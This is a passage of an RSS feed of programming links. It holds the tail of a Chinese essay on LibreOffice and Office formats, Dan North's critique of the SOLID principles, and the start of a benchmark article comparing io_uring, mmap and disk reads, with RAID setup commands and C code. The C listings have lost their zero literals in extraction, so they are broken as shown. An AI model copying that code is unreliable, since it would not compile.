25171;&#21253;&#65292;&#25172;&#36827;&#19968;&#20010; XML &#23481;&#22120;&#65292;&#28982;&#21518;&#21033;&#29992;&#20854;&#24066;&#22330;&#21147;&#37327;&#25512;&#21521;&#19990;&#30028;&#65292;&#24182;&#36843;&#20351;&#20854;&#20182;&#20154;&#26469;&#25215;&#25285;&#29702;&#35299;&#21644;&#28040;&#21270;&#30340;&#25104;&#26412;&#12290;&#23613;&#31649;&#26412;&#25991;&#20027;&#24352;&#23558;&#36825;&#19982; LibreOffice &#25152;&#25351;&#25511;&#30340;&#12300;&#33988;&#24847;&#30772;&#22351;&#31454;&#20105;&#12301;&#20316;&#20986;&#21306;&#20998;&#65292;&#20294;&#26174;&#28982;&#65292;&#19968;&#20010;&#30772;&#30862;&#12289;&#20302;&#36136;&#37327;&#30340;&#26631;&#20934;&#65292;&#26080;&#35770;&#20854;&#24418;&#25104;&#26159;&#28304;&#20110;&#38452;&#35851;&#36824;&#26159;&#30095;&#24573;&#65292;&#37117;&#26159;&#20250;&#23545;&#29983;&#24577;&#31995;&#32479;&#36896;&#25104;&#25439;&#23475;&#30340;&#12290;</p><p>&#20294;&#21478;&#19968;&#26041;&#38754;&#65292;LibreOffice &#25991;&#31456;&#25152;&#21453;&#26144;&#20986;&#30340;&#26576;&#20123;&#24605;&#32500;&#20063;&#19981;&#20540;&#24471;&#40723;&#21169;&#12290;&#23427;&#20687;&#35768;&#22810;&#24320;&#28304;&#25317;&#36280;&#30340;&#24120;&#35265;&#35770;&#35843;&#19968;&#26679;&#65292;&#12300;&#24680;&#38081;&#19981;&#25104;&#38050;&#12301;&#22320;&#25351;&#36131;&#29992;&#25143;&#19981;&#21152;&#25209;&#21028;&#22320;&#25509;&#21463;&#24494;&#36719;&#30340;&#23553;&#38381;&#25216;&#26415;&#12290;&#20294;&#29992;&#25143;&#24182;&#19981;&#20667;&#12290;&#25216;&#26415;&#30340;&#20248;&#38597;&#12289;&#25480;&#26435;&#30340;&#24320;&#25918;&#22266;&#28982;&#26159;&#20248;&#28857;&#65292;&#20294;&#23545;&#22823;&#22810;&#25968;&#29992;&#25143;&#26469;&#35828;&#65292;&#36825;&#21482;&#26159;&#20915;&#31574;&#30340;&#20247;&#22810;&#32771;&#37327;&#20043;&#19968;&#65292;&#29978;&#33267;&#19981;&#26159;&#26368;&#20027;&#35201;&#30340;&#22240;&#32032;&#12290;&#20316;&#20026; ODF &#26684;&#24335;&#30340;&#12300;&#26071;&#33328;&#12301;&#36719;&#20214;&#65292;LibreOffice &#33258;&#36523;&#20174;&#35774;&#35745;&#21040;&#20132;&#20114;&#20877;&#21040;&#24615;&#33021;&#65292;&#37117;&#23384;&#22312;&#35768;&#22810;&#31895;&#31961;&#20043;&#22788;&#12290;&#20197;&#33267;&#20110;&#21363;&#20351; Office &#19981;&#26029;&#29992;&#33219;&#32959;&#30340;&#21151;&#33021;&#33258;&#24223;&#27494;&#21151;&#65292;&#22312;&#22810;&#25968;&#20154;&#30524;&#20013;&#23427;&#20381;&#28982;&#27604; LibreOffice &#26356;&#12300;&#26131;&#29992;&#12301;&#12290;&#22914;&#26524;&#19981;&#33021;&#27491;&#35270;&#24182;&#31995;&#32479;&#22320;&#25913;&#21892;&#36825;&#20123;&#38382;&#39064;&#65292;&#37027;&#20040;&#23545;&#24320;&#28304;&#36719;&#20214;&#21644;&#24320;&#25918;&#26684;&#24335;&#30340;&#40723;&#21561;&#65292;&#23601;&#21482;&#33021;&#20572;&#30041;&#22312;&#21898;&#21475;&#21495;&#21644;&#39038;&#24433;&#33258;&#24604;&#30340;&#23618;&#38754;&#65292;&#26082;&#26080;&#27861;&#35753;&#20854;&#22768;&#38899;&#34987;&#26356;&#24191;&#27867;&#30340;&#20154;&#32676;&#25509;&#32435;&#65292;&#20063;&#38590;&#20197;&#23545;&#22404;&#26029;&#24066;&#22330;&#26500;&#25104;&#23454;&#36136;&#24615;&#30340;&#25361;&#25112;&#12290;</p></section> </section>]]></description><pubDate>Sat, 06 Sep 2025 04:39:06 +0530</pubDate></item><item><link>https://dannorth.net/blog/cupid-the-back-story/</link><title>I just want to know if there are more people thinking that SOLID is overrated and sometimes add unnecessary complexity (dannorth.net)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1n9ak7g/i_just_want_to_know_if_there_are_more_people/</guid><comments>https://www.reddit.com/r/programming/comments/1n9ak7g/i_just_want_to_know_if_there_are_more_people/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 17 min | <a href='https://www.reddit.com/r/programming/comments/1n9ak7g/i_just_want_to_know_if_there_are_more_people/'>Post permalink</a></p></section><section class='separator separator-after-permalink'><p>&nbsp;</p><hr><p>&nbsp;</p></section><section class='selftext'><!-- SC_OFF --><div class="md"><p>I think SOLID it could be good, however try to follows strictly SOLID principles can easily become a problem. I have been working in software industry for around 15 years. I remember one time when I had to debug old code that abuse so much about using inheritance/interfaces. There was around 8 levels of inheritance/interfaces, all clases are almos empty with only skeleton just to support next class, at the end the source file that made the magic was only a simple division, something like </p><p>double myVal=a/b;</p><p>I&#39;m pretty sure that was donde because original team did it just to &quot;prepare&quot; code for the future, but the truth is that only brings more problem that solutions</p></div><!-- SC_ON --></section><section class='separator separator-after-selftext'><p>&nbsp;</p><hr><p>&nbsp;</p></section><section class='parsed-content'><div><details> <summary>Table of Contents</summary> <nav> <ul> <li><a href="https://dannorth.net#why-every-single-element-of-solid-is-wrong">Why every single element of SOLID is wrong</a> <ul> <li><a href="https://dannorth.net#single-responsibility-principle">Single Responsibility Principle</a></li> <li><a href="https://dannorth.net#open-closed-principle">Open-Closed Principle</a></li> <li><a href="https://dannorth.net#liskov-substitution-principle">Liskov Substitution Principle</a></li> <li><a href="https://dannorth.net#interface-segregation-principle">Interface Segregation Principle</a></li> <li><a href="https://dannorth.net#dependency-inversion-principle">Dependency Inversion Principle</a></li> </ul> </li> <li><a href="https://dannorth.net#if-you-dont-like-them-i-have-others">&lsquo;If you don&rsquo;t like them, I have others&rsquo;</a></li> </ul> </nav> </details> <blockquote><p>&ldquo;If you had to offer some principles for modern software development, which would you choose?&rdquo;</p></blockquote><p>At a recent <a href="https://www.extremetuesday.com">Extreme Tuesday Club</a> (XTC) virtual meet-up, we were discussing <a href="https://www.meetup.com/eXtreme-Tuesday-Club-XTC/events/xhgncsyccfbdb/">whether the SOLID principles are outdated</a>. A while ago I gave a tongue-in-cheek talk on the topic, so ahead of the meet-up one of the organizers asked what principles I would replace SOLID with since I disagreed with them. I have been thinking about this for some time and I proposed five of my own, which form the acronym <em>CUPID</em>.</p><p>This article isn&rsquo;t about those principles, that will be my next post. This is about why I think we need them. I want to share the back story and explain why I&rsquo;ve never really bought into SOLID. To do that, let&rsquo;s talk about the talk.</p><h2>Why every single element of SOLID is wrong<a href="https://dannorth.net#why-every-single-element-of-solid-is-wrong"></a> </h2><p><a href="https://pubconf.io">PubConf</a> was invented as a kind of afterparty to the NDC conferences. As the name suggests, it takes place in a pub. Several speakers give an Ignite-style talk - 20 slides, 15 seconds per slide, auto-advancing - and the audience roars, stamps, claps and thunders its approval accordingly. The winner gets something and everyone has a great time.</p><p>A few years ago I was invited to speak at a PubConf event in London. I like the challenge of a constrained talk. This one had to be drunk-people funny and Ignite-shaped. I had been thinking about Robert C. Martin&rsquo;s <a href="https://www.baeldung.com/solid-principles">SOLID principles</a>, and in the spirit of &ldquo;it depends&rdquo; I thought it would be fun to see whether I could refute each principle with a straight face. I also wanted to propose an alternative in each case.</p><p>Now some talks write themselves: I figured I could use one slide to introduce each principle, one to challenge it, one to pitch an alternative, five times. That&rsquo;s 15 slides, with 45 seconds per principle. Top-and-tail it, and there were my 20 slides!</p><p>As I wrote the talk I noticed two things. First, it was much easier to refute each principle than I thought (apart from Liskov&rsquo;s Substitution Principle, so I had to tackle that a different way). Second, the alternative kept turning out to be the same thing: <em>Write simple code</em>. It is easy to challenge that with &ldquo;What does &lsquo;simple&rsquo; even mean?&rdquo; but I had a good working definition for that so I wasn&rsquo;t too worried.</p><p>After the conference I put <a href="https://speakerdeck.com/tastapod/why-every-element-of-solid-is-wrong">the slides up on SpeakerDeck</a> and a whole load of people I have never met started attacking first the premise of the talk, then the detail of slides from a talk they never heard me give, then <a href="https://www.entropywins.wtf/blog/2017/02/17/why-every-single-argument-of-dan-north-is-wrong/">me personally</a>.</p><p>Since I&rsquo;ve never written it up, here is roughly how the talk went. Bear in mind that for each principle, I had 15 seconds to introduce it, 15 seconds to challenge it, and 15 seconds to propose an alternative. Ready? Go!</p><h3>Single Responsibility Principle<a href="https://dannorth.net#single-responsibility-principle"><svg><path></path></svg></a> </h3><p>The Single Responsibility Principle says that code should only do one thing. Another framing is that it should have &ldquo;one reason to change&rdquo;. I called this the &ldquo;Pointlessly Vague Principle&rdquo;. What is one thing anyway? Is ETL - Extract-Transform-Load - one thing (a <code>DataProcessor</code>) or three things? Any non-trivial code can have any number of reasons to change, which may or may not include the one you had in mind, so again this doesn&rsquo;t make much sense to me.</p><p>Instead I suggested to <em>write simple code</em> using the heuristic that it &ldquo;Fits In My Head&rdquo;. What does that mean? You can only reason about something if it fits in your head. Conversely, if something doesn&rsquo;t fit in your head, you can&rsquo;t reason about it. Code should fit in your head at any level of granularity, whether it is at method/function level, class/module level, components made up of classes, or entire distributed applications.</p><p>You might ask &lsquo;Whose head?&rsquo; For the purpose of the heuristic I assume the owner of the head can read and write idiomatic code in whichever languages are in play, and that they are familiar with the problem domain. If they need more esoteric knowledge than that, for instance knowing which of the many undocumented internal systems we need to integrate with to get any work done, then that should be made explicit in the code so that it will fit in their head.</p><p>At each scale there should be enough conceptual integrity that you can grasp &ldquo;the whole&rdquo; at that level. If you can&rsquo;t, then that is a heuristic to strive for in your restructuring activities. Sometimes you can bundle several things together and they still fit in your head. The bundling even makes them easier to reason about than if they are artificially split out because someone insisted on Single Responsibility. In other cases, it makes sense to decompose a single responsibility artificially into several steps just to make each one easier to reason about.</p><h3>Open-Closed Principle<a href="https://dannorth.net#open-closed-principle"></a> </h3><p>This is the idea that code should be <em>open for extension</em>, i.e. easy to extend without changing, and <em>closed for modification</em>, i.e. you can trust what it does so you don&rsquo;t need to go in and tinker with it.</p><p>This was sage advice in an age where code was:</p><ul> <li><strong>expensive to change:</strong> Try making a small change and then compiling and linking a few million lines of C++ in the 1990s. I&rsquo;ll wait.</li> <li><strong>risky to change</strong>, because we hadn&rsquo;t figured out <a href="https://www.refactoring.com">refactoring</a> yet, never mind <a href="https://www.jetbrains.com">refactoring IDEs</a> (outside of Smalltalk) or <a href="https://www.martinfowler.com/bliki/TestDrivenDevelopment.html">example-guided programming</a>.</li> <li><strong>mostly additive:</strong> You would write some code, check it in (if you were down with the kids and using a version control system like RCS or SCCS), and then move on to the next file. You were translating the detailed functional spec into code, one lump at a time. Renaming things was uncommon; renaming files doubly so. CVS, which became the ubiquitous source control system, would <em>literally forget the entire history of a file</em> if you renamed it, it was such an uncommon activity. This is easy to overlook in an age of automated refactoring, and changeset-based version control.</li> </ul><p>Nowadays, the equivalent advice if you need code to do something else is: <em>Change the code to make it do something else!</em> It sounds trite, but we think of code as malleable now <a href="https://www.artima.com/articles/working-the-program">like clay</a>, where in the Olden Days the metaphor was more like building blocks. There was no feedback loop between The Spec and The Code like we have with automated examples.</p><p>In this case I railed against the &lsquo;Cruft Accretion Principle". Code is not an &ldquo;asset&rdquo; to be carefully shrink-wrapped and preserved, but a cost, a debt. <em>All code is cost.</em> So if I can take a big pile of existing cost and replace it with a smaller more specific cost, then I&rsquo;m winning at code! <em>Write simple code</em> that is easy to change, and you have code that is both open and closed, however you need it.</p><h3>Liskov Substitution Principle<a href="https://dannorth.net#liskov-substitution-principle"><svg><path></path></svg></a> </h3><p>This is just the <a href="https://en.wikipedia.org/wiki/Principle_of_least_astonishment">Principle of Least Surprise</a> applied to code substitution, and as such is pretty sensible. If I tell you something is a valid subtype of the thing you have, then you should be able to assume it will act the same in any sense that you care about.</p><p>However, the language LSP uses of &ldquo;subtypes&rsquo;, coupled with the way most developers conflate subtypes with subclasses, and the vagaries of &ldquo;desirable properties&rsquo;, means that it tends to evoke the class-based inheritance language of &ldquo;<em>is-a</em>&rdquo; and &ldquo;<em>has-a</em>&rdquo;, and its corresponding 1980s entity modelling.</p><p>In the spirit of using a butter knife as a screwdriver, many objects can &ldquo;<em>act-like-a</em>&rdquo; or &ldquo;<em>sometimes-be-used-as-a</em>&rdquo; or &ldquo;<em>pass-off-as-a-if-you-squint</em>&rdquo;. In this context what we really want is small, simple types that we can compose into whatever more complex structures we need, and to make our peace with all the nuances that go along with that. My advice, <em>quelle surprise</em>, is to &ldquo;write simple code&rdquo; that is easy to reason about.</p><h3>Interface Segregation Principle<a href="https://dannorth.net#interface-segregation-principle"></a> </h3><p>This really is fish-in-a-barrel as principles go. For some reason, this one caused the most controversy, but to me it is the easiest to debunk. While <a href="https://en.wikipedia.org/wiki/Interface_segregation_principle">researching</a> this talk I discovered that this pattern came about when Robert C. Martin was wrangling a <a href="https://en.wikipedia.org/wiki/God_object">God object</a> in the middle of some printing software at Xerox. Everything was happening in a class called <code>Job</code>. His approach to simplifying it was to find each place where it was used, figure out which methods &ldquo;went together&rdquo; and put those in an intermediate interface. This had several immediate benefits:</p><ul> <li>Collecting related methods into different interfaces showed all the different responsibilities the <code>Job</code> class was performing.</li> <li>Giving each interface an intention-revealing name made the code easier to reason about than just passing a <code>Job</code> object around.</li> <li>It created the option to break the <code>Job</code> class out into smaller classes fronted by each interface. (Arguably they didn&rsquo;t need the interface any more now.)</li> </ul><p>All of this makes sense, it&rsquo;s just that it isn&rsquo;t a principle, it is a pattern. A principle is something that is generally good advice in any context: Seek first to understand, then to be understood; Be excellent to each other.</p><p>A pattern is a strategy that works in a given context (God class) that has benefits (smaller components) and trade-offs (more separate things to manage). The principle would have been about not getting into that mess in the first place!</p><p>Thus I argued that if this were a principle at all, it was the &ldquo;Stable Door Principle&rdquo;. If you had small, role-based classes in the first place, you wouldn&rsquo;t be in the position of trying to decompose a huge, tangled mess.</p><p>Sure, we may find ourselves in that context from time to time, and when we do, interface segregation is a perfectly cromulent strategy for slicing your way towards sanity, along with building a suite of <a href="https://michaelfeathers.silvrback.com/characterization-testing">characterization tests</a> and all of the other advice in Mike Feathers&rsquo; brilliant <a href="https://www.pearson.com/us/higher-education/program/Feathers-Working-Effectively-with-Legacy-Code/PGM254740.html">Working Effectively With Legacy Code</a>.</p><h3>Dependency Inversion Principle<a href="https://dannorth.net#dependency-inversion-principle"><svg><path></path></svg></a> </h3><p>While there is nothing fundamentally wrong with DIP, I don&rsquo;t think it is an overstatement to say that our obsession with dependency inversion has single-handedly caused billions of dollars in irretrievable sunk cost and waste over the last couple of decades.</p><p>The real principle here is <em>option</em> inversion. A dependency is only interesting when there might be multiple ways of providing it, and you only need to invert the relationship when you believe the wiring is important enough to become a separate concern. That&rsquo;s quite a high bar, and mostly all you ever need is a <code>main</code> method.</p><p>If instead you subscribe to the idea that all dependencies should be inverted all the time, you end up with J2EE, OSGi, Spring, or any other &ldquo;declarative assembly&rdquo; framework where the structuring of the components is itself a twisty maze of config. J2EE deserves a special mention for deciding that each type of dependency inversion - EJBs, servlets, web domains, remote service location, even the configuration configuration - should be owned by different roles.</p><p>In the wild, there are entire shadow codebases where each class is backed by exactly one interface, which only exists to satisfy a wiring framework or to inject a mock or stub for automated testing theatre. The promise of &ldquo;you can just swap out the database&rdquo; evaporates as soon as you try to, well, swap out the database.</p><p>Most dependencies don&rsquo;t need inverting, because most dependencies aren&rsquo;t options, they are just the way we are going to do it this time. So my - by now entirely unsurprising - suggestion is to <em>write simple code</em>, by focusing on use rather than reuse.</p><h2>&lsquo;If you don&rsquo;t like them, I have others&rsquo;<a href="https://dannorth.net#if-you-dont-like-them-i-have-others"></a> </h2><p>When I look at SOLID, I see a mix of things that were once good advice, patterns that apply in a context, and advice that is easy to misapply. I wouldn&rsquo;t offer any of it as context-free advice to new programmers. So what would I do instead? I thought there might be a one-to-one correspondence for each of the SOLID principles and patterns, since there is nothing inherently bad or wrong with any of them, but as the saying goes, &lsquo;If I were going to Dublin, I wouldn&rsquo;t start from here.&rsquo;</p><p>So, given what I have learned about software development over the last 30 years, are there any principles that I would offer instead? And could they form a pithy acronym? The answer is in yes, and I will outline them in the next article.</p><p>Check out <a href="https://goalwards.co">Goalwards</a><sup>&reg;</sup>, our new business agility practice! </p><section> <hyvor-talk-comments></hyvor-talk-comments> </section> </div></section>]]></description><pubDate>Fri, 05 Sep 2025 22:23:43 +0530</pubDate></item><item><link>https://www.bitflux.ai/blog/memory-is-slow-part2/</link><title>io_uring is faster than mmap (bitflux.ai)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1n9ahja/io_uring_is_faster_than_mmap/</guid><comments>https://www.reddit.com/r/programming/comments/1n9ahja/io_uring_is_faster_than_mmap/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 41 min | <a href='https://www.reddit.com/r/programming/comments/1n9ahja/io_uring_is_faster_than_mmap/'>Post permalink</a></p></section><section class='separator separator-before-parsed-content'><p>&nbsp;</p><hr><p>&nbsp;</p></section><section class='parsed-content'><section> <h2>TL;DR</h2><p>Sourcing data directly from disk <em>IS</em> faster than caching in memory. I brought receipts. Because hardware got wider but not faster, the old methods don't get you there. You need new tools to use what is scaling and avoid what isn't.</p><h2>Introduction</h2><p>In part 1 I showed how some computer performance factors are scaling exponentially while others have been stagnant for decades. I then asserted, without proof, that sourcing data from disk can be faster than from memory. What follows is the proof.</p><p>Computer Science dogma says that unused memory should be used to cache things from the filesystem because the disk is slow and memory is fast. Given that disk bandwidth is growing exponentially and memory access latency has stagnated this isn't always true anymore.</p><h2>Experimental set up</h2><p>We need data and something straight forward to do with the data. I used my free will or the illusion thereof to create a benchmark I cleverly call "counting 10s". I write some pseudo random integers between 0 and 20 to a buffer and then count how many of the integers are 10. I want to make sure we are doing all the counting in a single thread to simulate an Amdahl's Law situation.</p><p>So how fast can we expect this to run? The upper limit would be the memory bandwidth.</p><p>My testing rig is a server with an old AMD EPYC 7551P 32-Core Processor on a Supermicro H11SSL-i and 96GB of DDR4 2133 MHz and a couple of 1.92TB Samsung PM983a PCIe 3.0 SSDs I pieced together from EBay parts. Given the way this server is configured, the upper limit for memory bandwidth can be calculated as 3 channels * 2133MT/s * 8B/T / 4 numa domains = ~13GB/s for a single thread. It's kind of an odd system but that just makes it more fun to optimize for!</p><p>The disks are rated at 3.1GB/s read BW each for an upper limit of 6.2GB/s. I made a raid0 volume with 4KB stripe size, formatted the the raid as ext4 with no journaling, and made sure it fully finished initializing the metadata before running the tests.</p><pre><code><span>sudo</span><span> mdadm</span><span> --create</span><span> /dev/md0</span><span> --level</span><span>=0</span><span> --raid-devices</span><span>=2</span><span> --chunk</span><span>=4K /dev/nvme1n1 /dev/nvme2n1 </span><span>sudo</span><span> mkfs.ext4</span><span> -F -L</span><span> data</span><span> -O</span><span> ^has_journal</span><span> -E</span><span> lazy_itable_init=0 /dev/md0 </span><span>sudo</span><span> mount</span><span> -o</span><span> noatime /dev/md0 mnt </span></code></pre><p>We'll use a 50GB dataset for most benchmarking here, because when I started this I thought the test system only had 64GB and it stuck.</p><h2>Simple Loop</h2><p>The simple and cleanest way to do this in C would look like this.</p><pre><code><span>#include </span><span>&lt;</span><span>stdio.h</span><span>&gt; </span><span>#include </span><span>&lt;</span><span>stdlib.h</span><span>&gt; </span><span>#include </span><span>&lt;</span><span>fcntl.h</span><span>&gt; </span><span>#include </span><span>&lt;</span><span>sys/mman.h</span><span>&gt; </span><span>// count_10_loop </span><span>int </span><span>main</span><span>(</span><span>int </span><span>argc</span><span>, </span><span>char </span><span>*</span><span>argv</span><span>[]) { </span><span>char</span><span>* filename = argv[</span><span>1</span><span>]; </span><span> size_t size_bytes = </span><span>strtoull</span><span>(argv[</span><span>2</span><span>], </span><span>NULL</span><span>, </span><span>10</span><span>); </span><span> size_t total_ints = size_bytes / sizeof(</span><span>int</span><span>); </span><span> size_t count = </span><span>; </span><span> </span><span>int</span><span> fd = </span><span>open</span><span>(filename, O_RDONLY); </span><span>int</span><span>* data = (</span><span>int</span><span>*)</span><span>mmap</span><span>(</span><span>NULL</span><span>, size_bytes, PROT_READ, MAP_SHARED, fd, </span><span>); </span><span> </span><span>for </span><span>(size_t i = </span><span>; i &lt; total_ints; ++i) { </span><span>if </span><span>(data[i] == </span><span>10</span><span>) count++; </span><span> } </span><span> </span><span>printf</span><span>("</span><span>Found </span><span>%ld</span><span> 10s</span><span>\n</span><span>", count); </span><span>} </span></code></pre><p>Just mmap() the file which will give us a buffer that we can read from. Then we just loop and count the 10s.</p><p>Because the point is to benchmark we will integrate some timing mechanisms before we move on.</p><pre><code><span>#include </span><span>&lt;</span><span>stdio.h</span><span>&gt; </span><span>#include </span><span>&lt;</span><span>stdlib.h</span><span>&gt; </span><span>#include </span><span>&lt;</span><span>fcntl.h</span><span>&gt; </span><span>#include </span><span>&lt;</span><span>sys/mman.h</span><span>&gt; </span><span>#include </span><span>&lt;</span><span>sys/time.h</span><span>&gt; </span><span>long </span><span>get_time_us</span><span>() { </span><span>struct</span><span> timeval tv; </span><span>gettimeofday</span><span>(&amp;tv, </span><span>NULL</span><span>); </span><span>return</span><span> tv.</span><span>tv_sec </span><span>* </span><span>1000000</span><span>L </span><span>+ tv.</span><span>tv_usec</span><span>; </span><span>} </span><span>// count_10_loop </span><span>int </span><span>main</span><span>(</span><span>int </span><span>argc</span><span>, </span><span>char </span><span>*</span><span>argv</span><span>[]) { </span><span>char</span><span>* filename = argv[</span><span>1</span><span>]; </span><span> size_t size_bytes = </span><span>strtoull</span><span>(argv[</span><span>2</span><span>], </span><span>NULL</span><span>, </span><span>10</span><span>); </span><span> size_t total_ints = size_bytes / sizeof(</span><span>int</span><span>); </span><span> size_t count = </span><span>; </span><span> </span><span>int</span><span> fd = </span><span>open</span><span>(filename, O_RDONLY); </span><span>int</span><span>* data = (</span><span>int</span><span>*)</span><span>mmap</span><span>(</span><span>NULL</span><span>, size_bytes, PROT_READ, MAP_SHARED, fd, </span><span>); </span><span> </span><span>long</span><span> start = </span><span>get_time_us</span><span>(); </span><span>for </span><span>(size_t i = </span><span>; i &lt; total_ints; ++i) { </span><span>if </span><span>(data[i] == </span><span>10</span><span>) count++; </span><span> } </span><span>long</span><span> elapsed = </span><span>get_time_us</span><span>() - start; </span><span> </span><span>printf</span><span>("</span><span>simple loop found </span><span>%ld</span><span> 10s processed at </span><span>%0.2f</span><span> GB/s</span><span>\n</span><span>", count, (</span><span>double</span><span>)(size_bytes/</span><span>1073741824</span><span>)/((</span><span>double</span><span>)elapsed/</span><span>1.0e6</span><span>)); </span><span>} </span></code></pre><p>For the first run we're going to be reading from the disk. The disk/filesystem read is going to limit the performance before the memory bandwidth can.</p><pre><code><span>&#10095; sudo ./count_10_loop ./mnt/datafile.bin 53687091200 </span><span>simple loop found 167802249 10s processed at 0.61 GB/s </span></code></pre><p>As expected, it's not anywhere near memory speeds because as everyone knows, disk is slow. We can look at the system and confirm that the first run cached the data to memory.</p><p>Our expectation is that the second run will be faster because the data is already in memory and as everyone knows, memory is fast.</p><pre><code><span>&#10095; sudo ./count_10_loop ./mnt/datafile.bin 53687091200 </span><span>simple loop found 167802249 10s processed at 3.71 GB/s </span></code></pre><p>It is faster, but clearly that&rsquo;s slower than the memory can feed it to the processor. What bottleneck might we be hitting? This speed does look possibly correlated to the instructions per second limit for this generation of CPU (between 2GHz * 1.5 IPC = 3G and 3GHz boost * 1.5 IPC = 4.5G instructions per second).</p><p>We can use perf to see if the CPU is using vector instructions, if not then the actual compute is the bottleneck.</p><pre><code><span>Percent&#9474; test %rbp,%rbp </span><span> &#9474; &darr; je 84 </span><span> &#9474; lea (%rbx,%rbp,4),%rcx </span><span> &#9474; mov %rbx,%rax </span><span> &#9474; xor %ebp,%ebp </span><span> &#9474; nop </span><span> &#9474;70: xor %edx,%edx </span><span> 1.31 &#9474; cmpl $0xa,(%rax) </span><span> 42.38 &#9474; sete %dl </span><span> 45.72 &#9474; add $0x4,%rax </span><span> 0.01 &#9474; add %rdx,%rbp </span><span> 10.42 &#9474; cmp %rax,%rcx </span><span> 0.16 &#9474; &uarr; jne 70 </span><span> &#9474;84: xor %eax,%eax </span><span> &#9474; shr $0x14,%r12 </span><span> &#9474; &rarr; call get_time_us </span><span> &#9474; pxor %xmm0,%xmm0 </span><span> &#9474; pxor %xmm1,%xmm1 </span></code></pre><p>Confirmed. We're running non-vectorized instructions, with a single thread counting that's as fast as it can go with a 2GHz CPU. Well crap. We&rsquo;ve hit our first non-exponential limit. Even a brand new CPU running this machine code would probably struggle to do much better than a 50% improvement, still well below the memory bandwidth limit.</p><h2>Unrolling the loop</h2><p>Good news is this code can definitely be vectorized if we help the compiler. Unroll the loop!</p><p>We're gonna make it very obvious to the compiler that it's safe to use vector instructions which could process our integers up to 8x faster.</p><pre><code><span>#include </span><span>&lt;</span><span>stdio.h</span><span>&gt; </span><span>#include </span><span>&lt;</span><span>stdlib.h</span><span>&gt; </span><span>#include </span><span>&lt;</span><span>fcntl.h</span><span>&gt; </span><span>#include </span><span>&lt;</span><span>sys/mman.h</span><span>&gt; </span><span>#include </span><span>&lt;</span><span>stdint.h</span><span>&gt; </span><span>#include </span><span>&lt;</span><span>sys/time.h</span><span>&gt; </span><span>long </span><span>get_time_us</span><span>() { </span><span>struct</span><span> timeval tv; </span><span>gettimeofday</span><span>(&amp;tv, </span><span>NULL</span><span>); </span><span>return</span><span> tv.</span><span>tv_sec </span><span>* </span><span>1000000</span><span>L </span><span>+ tv.</span><span>tv_usec</span><span>; </span><span>} </span><span>// count_10_unrolled </span><span>int </span><span>main</span><span>(</span><span>int </span><span>argc</span><span>, </span><span>char </span><span>*</span><span>argv</span><span>[]) { </span><span>char</span><span>* filename = argv[</span><span>1</span><span>]; </span><span> size_t size_bytes = </span><span>strtoull</span><span>(argv[</span><span>2</span><span>], </span><span>NULL</span><span>, </span><span>10</span><span>); </span><span> size_t total_ints = size_bytes / sizeof(</span><span>int</span><span>); </span><span> size_t count = </span><span>; </span><span> </span><span>int</span><span> fd = </span><span>open</span><span>(filename, O_RDONLY); </span><span>void</span><span>* buffer = </span><span>mmap</span><span>(</span><span>NULL</span><span>, size_bytes, PROT_READ, MAP_SHARED, fd, </span><span>); </span><span> </span><span>// Get the compiler to align the buffer </span><span>const int </span><span>* </span><span>__restrict</span><span> data = (</span><span>const int </span><span>* </span><span>__restrict</span><span>)</span><span>__builtin_assume_aligned</span><span>(buffer, </span><span>4096</span><span>); </span><span> uint64_t c0=</span><span>, c1=</span><span>, c2=</span><span>, c3=</span><span>, </span><span> c4=</span><span>, c5=</span><span>, c6=</span><span>, c7=</span><span>, </span><span> c8=</span><span>, c9=</span><span>, c10=</span><span>, c11=</span><span>, </span><span> c12=</span><span>, c13=</span><span>, c14=</span><span>, c15=</span><span>; </span><span> </span><span>long</span><span> start = </span><span>get_time_us</span><span>(); </span><span>// Unrolling the compiler knows it can use a vector unit like AVX2 to process </span><span>for </span><span>(size_t i = </span><span>; i &lt; total_ints; i += </span><span>16</span><span>) { </span><span>// removed 'if' to get it to be branchless: each compares to 10, adds 0 or 1 </span><span> c0 += (</span><span>unsigned</span><span>)(data[i+ </span><span>] == </span><span>10</span><span>); </span><span> c1 += (</span><span>unsigned</span><span>)(data[i+ </span><span>1</span><span>] == </span><span>10</span><span>); </span><span> c2 += (</span><span>unsigned</span><span>)(data[i+ </span><span>2</span><span>] == </span><span>10</span><span>); </span><span> c3 += (</span><span>unsigned</span><span>)(data[i+ </span><span>3</span><span>] == </span><span>10</span><span>); </span><span> c4 += (</span><span>unsigned</span><span>)(data[i+ </span><span>4</span><span>] == </span><span>10</span><span>); </span><span> c5 += (</span><span>unsigned</span><span>)(data[i+ </span><span>5</span><span>] == </span><span>10</span><span>); </span><span> c6 += (</span><span>unsigned</span><span>)(data[i+ </span><span>6</span><span>] == </span><span>10</span><span>); </span><span> c7 += (</span><span>unsigned</span><span>)(data[i+ </span><span>7</span><span>] == </span><span>10</span><span>); </span><span> c8 += (</span><span>unsigned</span><span>)(data[i+ </span><span>8</span><span>] == </span><span>10</span><span>); </span><span> c9 += (</span><span>unsigned</span><span>)(data[i+ </span><span>9</span><span>] == </span><span>10</span><span>); </span><span> c10 += (</span><span>unsigned</span><span>)(data[i+</span><span>10</span><span>] == </span><span>10</span><span>); </span><span> c11 += (</span><span>unsigned</span><span>)(data[i+</span><span>11</span><span>] == </span><span>10</span><span>); </span><span> c12 += (</span><span>unsigned</span><span>)(data[i+</span><span>12</span><span>] == </span><span>10</span><span>); </span><span> c13 += (</span><span>unsigned</span><span>)(data[i+</span><span>13</span><span>] == </span><span>10</span><span>); </span><span> c14 += (</span><span>unsigned</span><span>)(data[i+</span><span>14</span><span>] == </span><span>10</span><span>); </span><span> c15 += (</span><span>unsigned</span><span>)(data[i+</span><span>15</span><span>] == </span><span>10</span><span>); </span><span> } </span><span> </span><span>// pairwise reduce to help some compilers schedule better </span><span> uint64_t s0 = c0 + c1, s1 = c2 + c3, s2 = c4 + c5, s3 = c6 + c7; </span><span> uint64_t s4 = c8 + c9, s5 = c10 + c11, s6 = c12 + c13, s7 = c14 + c15; </span><span> uint64_t t0 = s0 + s1, t1 = s2 + s3, t2 = s4 + s5, t3 = s6 + s7; </span><span> count = (t0 + t1) + (t2 + t3); </span><span>long</span><span> elapsed = </span><span>get_time_us</span><span>() - start; </span><span> </span><span>printf</span><span>("</span><span>unrolled loop found </span><span>%ld</span><span> 10s processed at </span><span>%0.2f</span><span> GB/s</span><span>\n</span><span>", count, 